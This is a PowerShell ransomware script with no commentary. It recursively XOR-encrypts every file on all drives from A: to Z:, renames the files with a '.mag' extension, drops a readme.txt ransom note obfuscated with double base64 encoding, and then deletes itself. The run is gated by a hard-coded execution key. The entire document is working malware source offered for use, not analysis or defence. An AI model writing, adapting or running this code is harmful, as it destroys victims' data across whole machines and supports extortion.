function Decode-Base64-Twice {
    param (
        [string]$Base64String
    )
    # Decode the string twice
    $FirstDecoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Base64String))
    $SecondDecoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($FirstDecoded))
    return $SecondDecoded
}

function Create-RansomNote {
    param (
        [string]$TargetDirectory,
        [string]$NoteContent
    )
    $NotePath = Join-Path -Path $TargetDirectory -ChildPath "readme.txt"
    [System.IO.File]::WriteAllText($NotePath, $NoteContent)
    Write-Host "Ransom note created: $NotePath" -ForegroundColor Green
}

function XOR-EncryptDecrypt {
    param (
        [byte[]]$Data,
        [string]$Key
    )
    $KeyLength = $Key.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $Data[$i] = $Data[$i] -bxor [byte][char]$Key[$i % $KeyLength]
    }
    return $Data
}

function XOR-File {
    param (
        [string]$FilePath,
        [string]$Key
    )
    $Data = [System.IO.File]::ReadAllBytes($FilePath)
    $EncryptedData = XOR-EncryptDecrypt -Data $Data -Key $Key
    [System.IO.File]::WriteAllBytes($FilePath, $EncryptedData)
}

function Generate-MD5-Hash {
    param (
        [string]$Value
    )
    $MD5 = [System.Security.Cryptography.MD5]::Create()
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Value)
    $HashBytes = $MD5.ComputeHash($Bytes)
    $Hash = [BitConverter]::ToString($HashBytes) -replace "-", ""
    return $Hash.ToLower()
}

function Derive-EncryptionKey {
    $HashValue = Generate-MD5-Hash -Value "1777"
    $DerivedKey = $HashValue.Substring($HashValue.Length - 4, 4)
    return $DerivedKey
}

function Validate-ExecutionKey {
    param (
        [string]$ExecutionKey
    )
    if ($ExecutionKey -ne "1777") {
        Write-Host "Invalid execution key! The script will not proceed." -ForegroundColor Red
        return $false
    }
    return $true
}

function Get-AvailableDrives {
    # Check all drive letters from A:\ to Z:\
    $Drives = @()
    foreach ($Drive in 'A'..'Z') {
        $Path = "$Drive:\"
        if (Test-Path -Path $Path) {
            $Drives += $Path
        }
    }
    return $Drives
}

function Encrypt-Files {
    param (
        [string]$EncryptionKey,
        [string[]]$TargetDirectories
    )

    foreach ($TargetDirectory in $TargetDirectories) {
        Get-ChildItem -Path $TargetDirectory -Recurse -File | ForEach-Object {
            $FilePath = $_.FullName
            $NewFilePath = "$FilePath.mag"
            try {
                XOR-File -FilePath $FilePath -Key $EncryptionKey
                Rename-Item -Path $FilePath -NewName $NewFilePath
                Write-Host "Encrypted: $NewFilePath" -ForegroundColor Cyan
            } catch {
                Write-Host "Failed to encrypt $FilePath: $_" -ForegroundColor Yellow
            }
        }
        Create-RansomNote -TargetDirectory $TargetDirectory -NoteContent $DecodedNote
    }
}

function Self-Delete {
    $ScriptPath = $MyInvocation.MyCommand.Path
    try {
        Remove-Item -Path $ScriptPath -Force
        Write-Host "Script $ScriptPath has been deleted." -ForegroundColor Green
    } catch {
        Write-Host "Failed to delete script $ScriptPath: $_" -ForegroundColor Yellow
    }
}

function Main {
    param (
        [string]$ExecutionKey
    )

    if (-not (Validate-ExecutionKey -ExecutionKey $ExecutionKey)) {
        return
    }

    $Base64String = "U0drZ1RVRkhMQW9LV1c5MWNpQm1hV3hsY3lCb1lYWmxJR0psWlc0Z1pXNWpjbmx3ZEdWa0lRb0tWMmhoZENCb1lYQndaVzVsWkNCMGJ5QnRlU0JtYVd4bGN6OEtRV3hzSUhsdmRYSWdhVzF3YjNKMFlXNTBJR1pwYkdWeklDaGtiMk4xYldWdWRITXNJSEJvYjNSdmN5d2dkbWxrWlc5ekxDQmtZWFJoWW1GelpYTXNJR1YwWXk0cElHaGhkbVVnWW1WbGJpQmxibU55ZVhCMFpXUWdkMmwwYUNCemRISnZibWNnWlc1amNubHdkR2x2YmlCaGJHZHZjbWwwYUcxekxpQlpiM1VnWTJGdWJtOTBJR0ZqWTJWemN5QjBhR1Z0SUhkcGRHaHZkWFFnZEdobElHUmxZM0o1Y0hScGIyNGdhMlY1TGdvS1NHOTNJR1J2SUVrZ2NtVmpiM1psY2lCdGVTQm1hV3hsY3o4S1ZHOGdjbVZqYjNabGNpQjViM1Z5SUdacGJHVnpMQ0I1YjNVZ2JtVmxaQ0IwYnlCd2RYSmphR0Z6WlNCaElHUmxZM0o1Y0hScGIyNGdhMlY1SUdaeWIyMGdkWE11SUZsdmRTQnRkWE4wSUhObGJtUWdNQzQxSUVKcGRHTnZhVzRnS0VKVVF5a2dkRzhnZEdobElHWnZiR3h2ZDJsdVp5QmhaR1J5WlhOek9nb0tRbWwwWTI5cGJpQkJaR1J5WlhOek9pQXhSbVp0WWtobWJuQmhXbXBMUm5aNWFURnZhMVJxU2twMWMwNDBOVFZ3WVZCSUNncEJablJsY2lCd1lYbHRaVzUwTENCamIyNTBZV04wSUhWeklHRjBJRzkxY2lCelpXTjFjbVVnWlcxaGFXd2dZV1JrY21WemN6b0tjM1Z3Y0c5eWRFQnlaV052ZG1WeWVTMXpaWEoyYVdObExuUnNaQW9LU1c1amJIVmtaU0I1YjNWeUlIVnVhWEYxWlNCSlJDQnBiaUIwYUdVZ2MzVmlhbVZqZENCc2FXNWxPaUJCTVVJeUxVTXpSRFF0UlRWR05nb0tWMmhoZENCb1lYQndaVzV6SUdsbUlFa2daRzl1NG9DWmRDQndZWGsvQ2tsbUlIbHZkU0JrYnlCdWIzUWdjR0Y1SUhkcGRHaHBiaUEzTWlCb2IzVnljeXdnZVc5MWNpQmtaV055ZVhCMGFXOXVJR3RsZVNCM2FXeHNJR0psSUhCbGNtMWhibVZ1ZEd4NUlHUmxiR1YwWldRc0lHRnVaQ0I1YjNWeUlHWnBiR1Z6SUhkcGJHd2dZbVVnYkc5emRDQm1iM0psZG1WeUxpQUtDa05oYmlCSklIUnlkWE4wSUhsdmRUOEtWMlVnWVhKbElIQnliMlpsYzNOcGIyNWhiSE1nWVc1a0lHaGhkbVVnYzNWalkyVnpjMloxYkd4NUlHUmxZM0o1Y0hSbFpDQm1hV3hsY3lCbWIzSWdZV3hzSUhCaGVXbHVaeUJqZFhOMGIyMWxjbk11SUVOb1pXTnJJSFJvWlNCaGRIUmhZMmhsWkNCbWFXeGxJR1p2Y2lCd2NtOXZaaTRLQ2xkQlVrNUpUa2M2Q2tSdklHNXZkQ0JoZEhSbGJYQjBJSFJ2SUdSbFkzSjVjSFFnZVc5MWNpQm1hV3hsY3lCMWMybHVaeUIwYUdseVpDMXdZWEowZVNCemIyWjBkMkZ5WlNCdmNpQnRiMlJwWm5rZ2RHaGxiU0JwYmlCaGJua2dkMkY1TGlCRWIybHVaeUJ6YnlCdFlYa2djbVZ6ZFd4MElHbHVJSEJsY20xaGJtVnVkQ0JrWVhSaElHeHZjM011Q2c9PQ=="

    $DecodedNote = Decode-Base64-Twice -Base64String $Base64String
    $EncryptionKey = Derive-EncryptionKey

    # Get all available drives
    $AvailableDrives = Get-AvailableDrives
    Encrypt-Files -EncryptionKey $EncryptionKey -TargetDirectories $AvailableDrives
    Self-Delete
}

Main -ExecutionKey $args[0]
